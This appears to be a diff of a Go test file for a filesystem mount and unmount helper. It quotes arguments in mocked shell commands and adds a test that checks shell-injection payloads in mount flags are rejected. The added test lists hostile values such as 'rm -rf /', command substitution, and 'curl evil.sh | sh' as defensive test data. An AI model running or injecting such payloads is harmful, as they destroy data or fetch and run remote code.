@@ -278,7 +278,7 @@ func TestMountPath(t *testing.T) {
 			mockCommands: []shell.MockCommand{
 				{Pattern: "mkdir", Output: "", Error: nil},
 				{Pattern: "mount", Output: "", Error: nil}, // For IsMountPathExist check
-				{Pattern: "mount -t ext4 image-rootfs /mnt/test", Output: "", Error: nil},
+				{Pattern: "mount -t ext4 'image-rootfs' '/mnt/test'", Output: "", Error: nil},
 			},
 			expectError: false,
 		},
@@ -290,7 +290,7 @@ func TestMountPath(t *testing.T) {
 			mockCommands: []shell.MockCommand{
 				{Pattern: "mkdir", Output: "", Error: nil},
 				{Pattern: "mount", Output: "", Error: nil}, // For IsMountPathExist check
-				{Pattern: "mount -t ext4 image-rootfs /mnt/test", Output: "", Error: nil},
+				{Pattern: "mount -t ext4 'image-rootfs' '/mnt/test'", Output: "", Error: nil},
 			},
 			setupFunc: func(tempDir string) error {
 				return os.MkdirAll(filepath.Join(tempDir, "mnt", "test"), 0700)
@@ -350,7 +350,7 @@ func TestMountPath(t *testing.T) {
 			mountPoint: "/mnt/test",
 			mountFlags: "-t ext4",
 			mockCommands: []shell.MockCommand{
-				{Pattern: "mkdir -p /mnt/test", Output: "", Error: nil},
+				{Pattern: "mkdir -p '/mnt/test'", Output: "", Error: nil},
 				{Pattern: "mount", Output: "", Error: fmt.Errorf("mount command failed")},
 			},
 			expectError: true,
@@ -404,7 +404,7 @@ func TestUmountPath(t *testing.T) {
 			mockCommands: []shell.MockCommand{
 				{Pattern: "mkdir", Output: "", Error: nil},
 				{Pattern: "^mount$", Output: "ext4 on /mnt/test type ext4 (rw,relatime)", Error: nil},
-				{Pattern: "umount /mnt/test", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/test'", Output: "", Error: nil},
 			},
 			expectError: false,
 		},
@@ -414,8 +414,8 @@ func TestUmountPath(t *testing.T) {
 			mockCommands: []shell.MockCommand{
 				{Pattern: "mkdir", Output: "", Error: nil},
 				{Pattern: "^mount$", Output: "ext4 on /mnt/test type ext4 (rw,relatime)", Error: nil},
-				{Pattern: "umount /mnt/test", Output: "", Error: fmt.Errorf("device busy")},
-				{Pattern: "umount -l /mnt/test", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/test'", Output: "", Error: fmt.Errorf("device busy")},
+				{Pattern: "umount -l '/mnt/test'", Output: "", Error: nil},
 			},
 			expectError: false,
 		},
@@ -425,9 +425,9 @@ func TestUmountPath(t *testing.T) {
 			mockCommands: []shell.MockCommand{
 				{Pattern: "mkdir", Output: "", Error: nil},
 				{Pattern: "^mount$", Output: "ext4 on /mnt/test type ext4 (rw,relatime)", Error: nil},
-				{Pattern: "umount /mnt/test", Output: "", Error: fmt.Errorf("device busy")},
-				{Pattern: "umount -l /mnt/test", Output: "", Error: fmt.Errorf("still busy")},
-				{Pattern: "umount -f /mnt/test", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/test'", Output: "", Error: fmt.Errorf("device busy")},
+				{Pattern: "umount -l '/mnt/test'", Output: "", Error: fmt.Errorf("still busy")},
+				{Pattern: "umount -f '/mnt/test'", Output: "", Error: nil},
 			},
 			expectError: false,
 		},
@@ -437,10 +437,10 @@ func TestUmountPath(t *testing.T) {
 			mockCommands: []shell.MockCommand{
 				{Pattern: "mkdir", Output: "", Error: nil},
 				{Pattern: "^mount$", Output: "ext4 on /mnt/test type ext4 (rw,relatime)", Error: nil},
-				{Pattern: "umount /mnt/test", Output: "", Error: fmt.Errorf("device busy")},
-				{Pattern: "umount -l /mnt/test", Output: "", Error: fmt.Errorf("still busy")},
-				{Pattern: "umount -f /mnt/test", Output: "", Error: fmt.Errorf("still busy")},
-				{Pattern: "umount -lf /mnt/test", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/test'", Output: "", Error: fmt.Errorf("device busy")},
+				{Pattern: "umount -l '/mnt/test'", Output: "", Error: fmt.Errorf("still busy")},
+				{Pattern: "umount -f '/mnt/test'", Output: "", Error: fmt.Errorf("still busy")},
+				{Pattern: "umount -lf '/mnt/test'", Output: "", Error: nil},
 			},
 			expectError: false,
 		},
@@ -450,10 +450,10 @@ func TestUmountPath(t *testing.T) {
 			mockCommands: []shell.MockCommand{
 				{Pattern: "mkdir", Output: "", Error: nil},
 				{Pattern: "^mount$", Output: "ext4 on /mnt/test type ext4 (rw,relatime)", Error: nil},
-				{Pattern: "umount /mnt/test", Output: "", Error: fmt.Errorf("device busy")},
-				{Pattern: "umount -l /mnt/test", Output: "", Error: fmt.Errorf("still busy")},
-				{Pattern: "umount -f /mnt/test", Output: "", Error: fmt.Errorf("still busy")},
-				{Pattern: "umount -lf /mnt/test", Output: "", Error: fmt.Errorf("still busy")},
+				{Pattern: "umount '/mnt/test'", Output: "", Error: fmt.Errorf("device busy")},
+				{Pattern: "umount -l '/mnt/test'", Output: "", Error: fmt.Errorf("still busy")},
+				{Pattern: "umount -f '/mnt/test'", Output: "", Error: fmt.Errorf("still busy")},
+				{Pattern: "umount -lf '/mnt/test'", Output: "", Error: fmt.Errorf("still busy")},
 			},
 			expectError: true,
 			errorMsg:    "failed to unmount /mnt/test after trying all strategies",
@@ -516,8 +516,8 @@ func TestUmountAndDeletePath(t *testing.T) {
 			mountPoint: "/mnt/test",
 			mockCommands: []shell.MockCommand{
 				{Pattern: "^mount$", Output: "ext4 on /mnt/test type ext4 (rw,relatime)", Error: nil},
-				{Pattern: "umount /mnt/test", Output: "", Error: nil},
-				{Pattern: "rm -rf /mnt/test", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/test'", Output: "", Error: nil},
+				{Pattern: "rm -rf '/mnt/test'", Output: "", Error: nil},
 			},
 			expectError: false,
 		},
@@ -535,7 +535,7 @@ func TestUmountAndDeletePath(t *testing.T) {
 			mountPoint: "/mnt/test",
 			mockCommands: []shell.MockCommand{
 				{Pattern: "mount", Output: "", Error: nil}, // Mount point doesn't exist, unmount succeeds
-				{Pattern: "rm -rf /mnt/test", Output: "", Error: fmt.Errorf("permission denied")},
+				{Pattern: "rm -rf '/mnt/test'", Output: "", Error: fmt.Errorf("permission denied")},
 			},
 			expectError: true,
 			errorMsg:    "failed to remove mount point directory",
@@ -545,7 +545,7 @@ func TestUmountAndDeletePath(t *testing.T) {
 			mountPoint: "/mnt/test",
 			mockCommands: []shell.MockCommand{
 				{Pattern: "mount", Output: "", Error: nil}, // Not mounted
-				{Pattern: "rm -rf /mnt/test", Output: "", Error: nil},
+				{Pattern: "rm -rf '/mnt/test'", Output: "", Error: nil},
 			},
 			expectError: false,
 		},
@@ -588,9 +588,9 @@ func TestUmountSubPath(t *testing.T) {
 			mountPoint: "/mnt/chroot",
 			mockCommands: []shell.MockCommand{
 				{Pattern: "^mount$", Output: "proc on /mnt/chroot/proc type proc (rw,nosuid,nodev,noexec,relatime)\ntmpfs on /mnt/chroot/dev/shm type tmpfs (rw,nosuid,nodev)\nudev on /mnt/chroot/dev type devtmpfs (rw,nosuid,relatime)\n", Error: nil},
-				{Pattern: "umount /mnt/chroot/proc", Output: "", Error: nil},
-				{Pattern: "umount /mnt/chroot/dev/shm", Output: "", Error: nil},
-				{Pattern: "umount /mnt/chroot/dev", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/chroot/proc'", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/chroot/dev/shm'", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/chroot/dev'", Output: "", Error: nil},
 			},
 			expectError: false,
 		},
@@ -616,10 +616,10 @@ func TestUmountSubPath(t *testing.T) {
 			mountPoint: "/mnt/chroot",
 			mockCommands: []shell.MockCommand{
 				{Pattern: "^mount$", Output: "proc on /mnt/chroot/proc type proc (rw,nosuid,nodev,noexec,relatime)\n", Error: nil},
-				{Pattern: "umount /mnt/chroot/proc", Output: "", Error: fmt.Errorf("device busy")},
-				{Pattern: "umount -l /mnt/chroot/proc", Output: "", Error: fmt.Errorf("still busy")},
-				{Pattern: "umount -f /mnt/chroot/proc", Output: "", Error: fmt.Errorf("still busy")},
-				{Pattern: "umount -lf /mnt/chroot/proc", Output: "", Error: fmt.Errorf("still busy")},
+				{Pattern: "umount '/mnt/chroot/proc'", Output: "", Error: fmt.Errorf("device busy")},
+				{Pattern: "umount -l '/mnt/chroot/proc'", Output: "", Error: fmt.Errorf("still busy")},
+				{Pattern: "umount -f '/mnt/chroot/proc'", Output: "", Error: fmt.Errorf("still busy")},
+				{Pattern: "umount -lf '/mnt/chroot/proc'", Output: "", Error: fmt.Errorf("still busy")},
 			},
 			expectError: true,
 			errorMsg:    "failed to unmount /mnt/chroot/proc",
@@ -685,8 +685,8 @@ func TestMountSysfs(t *testing.T) {
 			mountPoint: "/mnt/chroot",
 			mockCommands: []shell.MockCommand{
 				{Pattern: "mkdir -p", Output: "", Error: nil},
-				{Pattern: "mount -t proc proc /mnt/chroot/proc", Output: "", Error: nil},
-				{Pattern: "mount -t sysfs -o nosuid,noexec,nodev sysfs /mnt/chroot/sys", Output: "", Error: fmt.Errorf("sys mount failed")},
+				{Pattern: "mount -t proc 'proc' '/mnt/chroot/proc'", Output: "", Error: nil},
+				{Pattern: "mount -t sysfs -o nosuid,noexec,nodev 'sysfs' '/mnt/chroot/sys'", Output: "", Error: fmt.Errorf("sys mount failed")},
 				{Pattern: "mount", Output: "", Error: nil}, // IsMountPathExist checks
 			},
 			expectError: true,
@@ -696,12 +696,12 @@ func TestMountSysfs(t *testing.T) {
 			name:       "dev_mount_failure",
 			mountPoint: "/mnt/chroot",
 			mockCommands: []shell.MockCommand{
-				{Pattern: "mkdir -p /mnt/chroot/proc", Output: "", Error: nil},
-				{Pattern: "mount -t proc proc /mnt/chroot/proc", Output: "", Error: nil},
-				{Pattern: "mkdir -p /mnt/chroot/sys", Output: "", Error: nil},
-				{Pattern: "mount -t sysfs -o nosuid,noexec,nodev sysfs /mnt/chroot/sys", Output: "", Error: nil},
-				{Pattern: "mkdir -p /mnt/chroot/dev", Output: "", Error: nil},
-				{Pattern: "mount -t devtmpfs -o mode=0700,nosuid devtmpfs /mnt/chroot/dev", Output: "", Error: fmt.Errorf("dev mount failed")},
+				{Pattern: "mkdir -p '/mnt/chroot/proc'", Output: "", Error: nil},
+				{Pattern: "mount -t proc 'proc' '/mnt/chroot/proc'", Output: "", Error: nil},
+				{Pattern: "mkdir -p '/mnt/chroot/sys'", Output: "", Error: nil},
+				{Pattern: "mount -t sysfs -o nosuid,noexec,nodev 'sysfs' '/mnt/chroot/sys'", Output: "", Error: nil},
+				{Pattern: "mkdir -p '/mnt/chroot/dev'", Output: "", Error: nil},
+				{Pattern: "mount -t devtmpfs -o mode=0700,nosuid 'devtmpfs' '/mnt/chroot/dev'", Output: "", Error: fmt.Errorf("dev mount failed")},
 				{Pattern: "mount", Output: "", Error: nil}, // IsMountPathExist checks
 			},
 			expectError: true,
@@ -758,12 +758,12 @@ func TestUmountSysfs(t *testing.T) {
 			mountPoint: "/mnt/chroot",
 			mockCommands: []shell.MockCommand{
 				{Pattern: "mount", Output: "proc on /mnt/chroot/proc type proc (rw,nosuid,nodev,noexec,relatime)\nsysfs on /mnt/chroot/sys type sysfs (rw,nosuid,nodev,noexec,relatime)\ndevtmpfs on /mnt/chroot/dev type devtmpfs (rw,nosuid,relatime)\ndevpts on /mnt/chroot/dev/pts type devpts (rw,nosuid,noexec,relatime)\ntmpfs on /mnt/chroot/dev/shm type tmpfs (rw,nosuid,nodev)\ntmpfs on /mnt/chroot/run type tmpfs (rw,nosuid,nodev,noexec,relatime)", Error: nil},
-				{Pattern: "umount /mnt/chroot/run", Output: "", Error: nil},
-				{Pattern: "umount /mnt/chroot/dev/pts", Output: "", Error: nil},
-				{Pattern: "umount /mnt/chroot/dev/shm", Output: "", Error: nil},
-				{Pattern: "umount /mnt/chroot/dev", Output: "", Error: nil},
-				{Pattern: "umount /mnt/chroot/sys", Output: "", Error: nil},
-				{Pattern: "umount /mnt/chroot/proc", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/chroot/run'", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/chroot/dev/pts'", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/chroot/dev/shm'", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/chroot/dev'", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/chroot/sys'", Output: "", Error: nil},
+				{Pattern: "umount '/mnt/chroot/proc'", Output: "", Error: nil},
 			},
 			expectError: false,
 		},
@@ -789,7 +789,7 @@ func TestUmountSysfs(t *testing.T) {
 			mountPoint: "/mnt/chroot",
 			mockCommands: []shell.MockCommand{
 				{Pattern: "mount", Output: "proc on /mnt/chroot/proc type proc (rw,nosuid,nodev,noexec,relatime)\n", Error: nil},
-				{Pattern: "umount /mnt/chroot/proc", Output: "", Error: fmt.Errorf("not found")},
+				{Pattern: "umount '/mnt/chroot/proc'", Output: "", Error: fmt.Errorf("not found")},
 			},
 			expectError: false, // "not found" errors are treated as warnings
 		},
@@ -927,9 +927,9 @@ func TestMountPath_EdgeCases(t *testing.T) {
 			mountPoint: "/mnt/test",
 			mountFlags: "",
 			mockCommands: []shell.MockCommand{
-				{Pattern: "mkdir -p /mnt/test", Output: "", Error: nil},
+				{Pattern: "mkdir -p '/mnt/test'", Output: "", Error: nil},
 				{Pattern: "mount", Output: "", Error: nil}, // IsMountPathExist check
-				{Pattern: "mount  image-rootfs /mnt/test", Output: "", Error: nil},
+				{Pattern: "mount  'image-rootfs' '/mnt/test'", Output: "", Error: nil},
 			},
 			expectError: false,
 		},
@@ -939,9 +939,9 @@ func TestMountPath_EdgeCases(t *testing.T) {
 			mountPoint: "/mnt/test",
 			mountFlags: "-t ext4 -o rw,relatime,user_xattr",
 			mockCommands: []shell.MockCommand{
-				{Pattern: "mkdir -p /mnt/test", Output: "", Error: nil},
+				{Pattern: "mkdir -p '/mnt/test'", Output: "", Error: nil},
 				{Pattern: "mount", Output: "", Error: nil}, // IsMountPathExist check
-				{Pattern: "mount -t ext4 -o rw,relatime,user_xattr image-rootfs /mnt/test", Output: "", Error: nil},
+				{Pattern: "mount -t ext4 -o rw,relatime,user_xattr 'image-rootfs' '/mnt/test'", Output: "", Error: nil},
 			},
 			expectError: false,
 		},
@@ -951,9 +951,9 @@ func TestMountPath_EdgeCases(t *testing.T) {
 			mountPoint: "/mnt/test with spaces",
 			mountFlags: "-t ext4",
 			mockCommands: []shell.MockCommand{
-				{Pattern: "mkdir -p /mnt/test with spaces", Output: "", Error: nil},
+				{Pattern: "mkdir -p '/mnt/test with spaces'", Output: "", Error: nil},
 				{Pattern: "mount", Output: "", Error: nil}, // IsMountPathExist check
-				{Pattern: "mount -t ext4 image-rootfs-12345678-1234-1234-1234-123456789abc /mnt/test with spaces", Output: "", Error: nil},
+				{Pattern: "mount -t ext4 'image-rootfs-12345678-1234-1234-1234-123456789abc' '/mnt/test with spaces'", Output: "", Error: nil},
 			},
 			expectError: false,
 		},
@@ -975,6 +975,50 @@ func TestMountPath_EdgeCases(t *testing.T) {
 				if err != nil {
 					t.Errorf("Expected no error, but got: %v", err)
 				}
+			}
+		})
+	}
+}
+
+// TestMountPath_RejectsMaliciousMountFlags verifies that MountPath refuses a
+// mountFlags string carrying shell metacharacters before it ever reaches the
+// bash -c command line, closing the injection path for callers that build
+// mountFlags from externally influenced data (e.g. a template's filesystem
+// type). The malicious cases must fail during validation, so no shell command
+// runs and a mock that would panic on any invocation still passes.
+func TestMountPath_RejectsMaliciousMountFlags(t *testing.T) {
+	originalExecutor := shell.Default
+	defer func() { shell.Default = originalExecutor }()
+	// Catch-all mock: NewMockExecutor falls back to the real DefaultExecutor for
+	// any command that matches no pattern, so a nil/empty mock would silently run
+	// real host commands if validation regressed. This pattern matches every
+	// invocation and returns an error, guaranteeing that if any shell command is
+	// reached the test fails loudly instead of shelling out on the dev machine/CI.
+	shell.Default = shell.NewMockExecutor([]shell.MockCommand{
+		{Pattern: ".*", Output: "", Error: fmt.Errorf("unexpected shell invocation: mountFlags validation should have rejected this before any command ran")},
+	})
+
+	maliciousFlags := []string{
+		"-t ext4; rm -rf /",
+		"-t $(reboot)",
+		"-t `id`",
+		"-t ext4 && curl evil.sh | sh",
+		"-t ext4 | tee /etc/passwd",
+		"-t ext4\nrm -rf /",
+		"-t 'ext4'",
+		"-t ext4 > /etc/hosts",
+	}
+	for i, flags := range maliciousFlags {
+		// Use a stable index for the subtest name: the payloads themselves carry
+		// newlines/backticks that would corrupt `go test` output and make -run
+		// selection awkward. The raw flags stay as test data only.
+		t.Run(fmt.Sprintf("payload_%d", i), func(t *testing.T) {
+			err := mount.MountPath("image-rootfs", "/mnt/test", flags)
+			if err == nil {
+				t.Fatalf("MountPath accepted malicious mountFlags %q, expected rejection", flags)
+			}
+			if !strings.Contains(err.Error(), "invalid mount flags") {
+				t.Errorf("expected an 'invalid mount flags' error for %q, got: %v", flags, err)
 			}
 		})
 	}
@@ -1016,12 +1060,12 @@ func TestUmountSysfs_OrderedUnmount(t *testing.T) {
 	mockCommands := []shell.MockCommand{
 		{Pattern: "mount", Output: "proc on /mnt/chroot/proc type proc (rw,nosuid,nodev,noexec,relatime)\nsysfs on /mnt/chroot/sys type sysfs (rw,nosuid,nodev,noexec,relatime)\ndevtmpfs on /mnt/chroot/dev type devtmpfs (rw,nosuid,relatime)\ndevpts on /mnt/chroot/dev/pts type devpts (rw,nosuid,noexec,relatime)\ntmpfs on /mnt/chroot/dev/shm type tmpfs (rw,nosuid,nodev)\ntmpfs on /mnt/chroot/run type tmpfs (rw,nosuid,nodev,noexec,relatime)", Error: nil},
 		// Unmount commands should be called in order: run, dev/pts, dev/shm, dev, sys, proc
-		{Pattern: "umount /mnt/chroot/run", Output: "", Error: nil},
-		{Pattern: "umount /mnt/chroot/dev/pts", Output: "", Error: nil},
-		{Pattern: "umount /mnt/chroot/dev/shm", Output: "", Error: nil},
-		{Pattern: "umount /mnt/chroot/dev", Output: "", Error: nil},
-		{Pattern: "umount /mnt/chroot/sys", Output: "", Error: nil},
-		{Pattern: "umount /mnt/chroot/proc", Output: "", Error: nil},
+		{Pattern: "umount '/mnt/chroot/run'", Output: "", Error: nil},
+		{Pattern: "umount '/mnt/chroot/dev/pts'", Output: "", Error: nil},
+		{Pattern: "umount '/mnt/chroot/dev/shm'", Output: "", Error: nil},
+		{Pattern: "umount '/mnt/chroot/dev'", Output: "", Error: nil},
+		{Pattern: "umount '/mnt/chroot/sys'", Output: "", Error: nil},
+		{Pattern: "umount '/mnt/chroot/proc'", Output: "", Error: nil},
 	}
 	shell.Default = shell.NewMockExecutor(mockCommands)
 
